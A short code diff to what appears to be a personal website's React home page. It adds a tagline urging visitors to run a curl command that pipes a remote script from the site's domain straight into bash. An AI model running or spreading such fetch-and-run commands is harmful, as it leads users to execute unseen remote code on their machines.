@@ -91,6 +91,9 @@ function Home() {
               Zach Upstone             
           </Link>
         </div>
+        <div className='tagLine'>
+          - Try running "curl https://zupstn.com/hypno.sh | bash" in bash  
+        </div>
       </div>
 
       <div className="searchLinksLeft">
